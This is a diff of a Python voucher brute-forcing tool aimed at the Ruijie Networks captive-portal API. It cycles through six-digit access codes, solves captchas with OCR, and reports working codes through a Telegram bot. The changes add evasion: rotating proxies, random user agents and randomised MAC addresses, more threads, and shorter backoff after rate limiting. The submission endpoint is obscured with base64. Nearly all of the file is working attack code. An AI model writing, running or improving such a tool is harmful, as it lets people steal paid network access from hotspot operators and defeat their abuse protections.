@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # ==============================================
-#  Ruijie Voucher Scanner  —  v7.6 (Inline Keyboard)
+#  Ruijie Voucher Scanner  —  v7.7 (Speed 1500 + IP Protection)
 # ==============================================
 
 import requests
@@ -61,12 +61,39 @@ def cprint(text, color=C.WHITE, bold=False, end="\n"):
 TARGET_URL = os.getenv("TARGET_URL", "")
 MODE = os.getenv("MODE", "6")
 SCAN_TYPE = os.getenv("SCAN_TYPE", "sequential")
-THREADS = int(os.getenv("THREADS", "50"))
+THREADS = int(os.getenv("THREADS", "100"))  # Increased for speed
+DELAY_BETWEEN_REQUESTS = 0.02  # 20ms delay for 1500 codes/min
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
 TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")
 ALLOWED_USERS = os.getenv("ALLOWED_USERS", TELEGRAM_CHAT_ID).split(",")
 FOUND_FILE = "found_voucher.txt"
 RESULT_FILE = "scan_results.txt"
+PROXY_FILE = "proxies.txt"
+
+# ── IP PROTECTION ──────────────────────────────────────────────────────
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
+]
+
+PROXY_LIST = []
+if os.path.exists(PROXY_FILE):
+    with open(PROXY_FILE, "r") as f:
+        PROXY_LIST = [line.strip() for line in f if line.strip()]
+    cprint(f"🌐 Loaded {len(PROXY_LIST)} proxies", C.GREEN)
+
+def random_user_agent():
+    return random.choice(USER_AGENTS)
+
+def get_random_proxy():
+    if PROXY_LIST:
+        return random.choice(PROXY_LIST)
+    return None
+
+def get_random_mac():
+    return ':'.join(f'{random.randint(0x00, 0xff):02x}' for _ in range(6))
 
 # =============================================
 #  FLASK WEB SERVER (for Render)
@@ -88,8 +115,9 @@ scanning_active = False
 current_scan_type = SCAN_TYPE
 current_mode = MODE
 current_url = TARGET_URL
+progress_msg_id = None
 
-def send_telegram(message, chat_id=None, reply_markup=None):
+def send_telegram(message, chat_id=None, reply_markup=None, return_id=False):
     if not TELEGRAM_BOT_TOKEN:
         return
     if chat_id is None:
@@ -99,7 +127,20 @@ def send_telegram(message, chat_id=None, reply_markup=None):
         payload = {"chat_id": chat_id, "text": message}
         if reply_markup:
             payload["reply_markup"] = reply_markup
-        requests.post(url, json=payload, timeout=10)
+        resp = requests.post(url, json=payload, timeout=10)
+        if return_id:
+            return resp.json().get("result", {}).get("message_id")
+    except:
+        pass
+
+def edit_telegram_message(message_id, message, chat_id=None):
+    if not TELEGRAM_BOT_TOKEN:
+        return
+    if chat_id is None:
+        chat_id = TELEGRAM_CHAT_ID
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
+    try:
+        requests.post(url, json={"chat_id": chat_id, "message_id": message_id, "text": message}, timeout=10)
     except:
         pass
 
@@ -128,7 +169,7 @@ def get_main_keyboard():
     }
 
 def handle_telegram_updates():
-    global current_scan_type, current_mode, current_url, scanning_active
+    global current_scan_type, current_mode, current_url, scanning_active, progress_msg_id
     last_update_id = 0
     while True:
         try:
@@ -146,7 +187,6 @@ def handle_telegram_updates():
             for update in data.get("result", []):
                 last_update_id = update.get("update_id", last_update_id)
                 
-                # Handle Callback Query (button clicks)
                 callback = update.get("callback_query")
                 if callback:
                     chat_id = str(callback.get("message", {}).get("chat", {}).get("id", ""))
@@ -192,6 +232,7 @@ def handle_telegram_updates():
                             send_telegram("❌ No URL set. Use 'Set URL' button first.", chat_id)
                             continue
                         scanning_active = True
+                        progress_msg_id = None
                         send_telegram(f"🚀 **Scan Started!**\nMode: `{current_mode}`\nType: `{current_scan_type}`", chat_id)
                         Thread(target=run_scan_thread, daemon=True).start()
                     elif data == "stop_scan":
@@ -201,12 +242,10 @@ def handle_telegram_updates():
                         scanning_active = False
                         send_telegram("⏹️ Scan stopped.", chat_id)
                     
-                    # Answer callback query
                     answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
                     requests.post(answer_url, json={"callback_query_id": callback["id"]})
                     continue
                 
-                # Handle text messages
                 message = update.get("message", {})
                 if not message:
                     continue
@@ -247,7 +286,7 @@ def handle_telegram_updates():
             time.sleep(5)
 
 def run_scan_thread():
-    global scanning_active
+    global scanning_active, progress_msg_id
     try:
         if current_mode == "6":
             start_code, end_code = 0, 999999
@@ -271,7 +310,7 @@ def run_scan_thread():
         scanning_active = False
 
 # =============================================
-#  ENGINE (same as before)
+#  ENGINE (with IP Protection)
 # =============================================
 _connector = None
 _voucher_sem = None
@@ -284,10 +323,10 @@ tried = 0
 hits = []
 lock = threading.Lock()
 start_time = None
+progress_msg_id = None
 
 def get_mac():
-    b = random.choice([0x02, 0x06, 0x0A, 0x0E])
-    return ":".join(f"{x:02x}" for x in ([b] + [random.randint(0, 255) for _ in range(5)]))
+    return get_random_mac()
 
 def replace_mac(url, new_mac):
     return re.sub(r'(?<=mac=)[^&]+', new_mac, url)
@@ -316,25 +355,30 @@ def _ocr_sync(image_bytes):
     return ocr.classification(buf.tobytes()).upper()
 
 async def get_session_id(sess, session_url, previous=None):
-    url = replace_mac(session_url, get_mac())
+    mac = get_mac()
+    url = replace_mac(session_url, mac)
     headers = {
         'accept': 'text/html,*/*',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36',
+        'user-agent': random_user_agent(),
         'upgrade-insecure-requests': '1',
     }
+    proxy = get_random_proxy()
+    proxy_url = f"http://{proxy}" if proxy else None
     try:
-        async with sess.get(url, headers=headers, allow_redirects=True, ssl=False) as r:
-            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url))
+        async with sess.get(url, headers=headers, allow_redirects=True, ssl=False, proxy=proxy_url) as req:
+            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
             return sid.group(1) if sid else previous
     except:
         return previous
 
 async def Captcha_Image(sess, session_id):
-    headers = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36'}
+    headers = {'user-agent': random_user_agent()}
+    proxy = get_random_proxy()
+    proxy_url = f"http://{proxy}" if proxy else None
     async with sess.get(
         'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
         params={'sessionId': session_id, '_t': str(time.time())},
-        headers=headers, ssl=False
+        headers=headers, ssl=False, proxy=proxy_url
     ) as r:
         return await r.read()
 
@@ -342,10 +386,12 @@ async def Captcha_Text(img_bytes):
     return await asyncio.to_thread(_ocr_sync, img_bytes)
 
 async def Varify_Captcha(sess, session_id, text):
-    headers = {'content-type': 'application/json'}
+    headers = {'content-type': 'application/json', 'user-agent': random_user_agent()}
+    proxy = get_random_proxy()
+    proxy_url = f"http://{proxy}" if proxy else None
     async with sess.post(
         'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
-        headers=headers, json={'sessionId': session_id, 'authCode': text}, ssl=False
+        headers=headers, json={'sessionId': session_id, 'authCode': text}, ssl=False, proxy=proxy_url
     ) as r:
         d = await r.json()
         return session_id if d.get("success") is True else None
@@ -355,11 +401,13 @@ async def Code_Expires_Date(session_id):
         f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}',
         f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}',
     ]
-    headers = {'accept': 'application/json', 'user-agent': 'Mozilla/5.0'}
+    headers = {'accept': 'application/json', 'user-agent': random_user_agent()}
+    proxy = get_random_proxy()
+    proxy_url = f"http://{proxy}" if proxy else None
     for url in endpoints:
         try:
             async with aiohttp.ClientSession(connector=_connector, connector_owner=False) as s:
-                async with s.get(url, headers=headers, ssl=False) as r:
+                async with s.get(url, headers=headers, ssl=False, proxy=proxy_url) as r:
                     data = await r.json()
                     res = data.get('result', {})
                     plan = res.get('profileName', 'Unknown')
@@ -378,6 +426,8 @@ _post_url = base64.b64decode(
 async def perform_check(session_url, code):
     global retry_total, tried, hits
     for attempt in range(3):
+        proxy = get_random_proxy()
+        proxy_url = f"http://{proxy}" if proxy else None
         async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=aiohttp.ClientTimeout(total=30)) as sess:
             session_id = await get_session_id(sess, session_url)
             if not session_id:
@@ -397,15 +447,15 @@ async def perform_check(session_url, code):
             if stop_flag:
                 return
             payload = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
-            headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0"}
+            headers = {"content-type": "application/json", "user-agent": random_user_agent()}
             try:
-                async with sess.post(_post_url, json=payload, headers=headers, ssl=False) as r:
+                async with sess.post(_post_url, json=payload, headers=headers, ssl=False, proxy=proxy_url) as r:
                     response = await r.text()
             except:
                 return
         if 'request limited' in response:
             retry_total += 1
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.3)
             continue
         break
     else:
@@ -452,7 +502,7 @@ def stats_printer():
     print()
 
 async def run_scan(session_url, start_code, end_code, workers):
-    global _voucher_sem, stop_flag, _connector, tried, hits, found_codes, limited_codes, retry_total, start_time
+    global _voucher_sem, stop_flag, _connector, tried, hits, found_codes, limited_codes, retry_total, start_time, progress_msg_id
     _init_ocr()
     tried = 0
     hits = []
@@ -478,6 +528,8 @@ async def run_scan(session_url, start_code, end_code, workers):
     stats_thread = threading.Thread(target=stats_printer, daemon=True)
     stats_thread.start()
     checked = 0
+    last_progress_time = time.time()
+    
     try:
         while not stop_flag:
             batch = []
@@ -488,15 +540,40 @@ async def run_scan(session_url, start_code, end_code, workers):
                     break
             if not batch:
                 break
+            
             async def _check(c):
                 async with _voucher_sem:
                     await perform_check(session_url, c)
+            
             await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)
             checked += len(batch)
+            
+            # Telegram progress update every 500ms
+            if time.time() - last_progress_time > 0.5:
+                elapsed = time.time() - start_time
+                speed = (checked / elapsed * 60) if elapsed > 0 else 0
+                progress = min(100, (checked / total) * 100) if total > 0 else 0
+                
+                msg = (f"🔍 **Scanning...**\n"
+                       f"📦 Checked: `{checked:,}/{total:,}`\n"
+                       f"📊 Progress: `{progress:.1f}%`\n"
+                       f"⚡ Speed: `{speed:.0f} codes/min`\n"
+                       f"✅ Found: `{len(found_codes)}`")
+                
+                if progress_msg_id:
+                    edit_telegram_message(progress_msg_id, msg)
+                else:
+                    msg_id = send_telegram(msg, return_id=True)
+                    if msg_id:
+                        progress_msg_id = msg_id
+                
+                last_progress_time = time.time()
+    
     except (asyncio.CancelledError, KeyboardInterrupt):
         stop_flag = True
     finally:
         await _connector.close()
+    
     elapsed = time.time() - start_time
     cprint(f"\n  [+] Completed in {elapsed:.2f} seconds", C.GREEN, bold=True)
     cprint(f"      Checked: {checked} | Found: {len(found_codes)} | Limited: {len(limited_codes)}", C.CYAN)
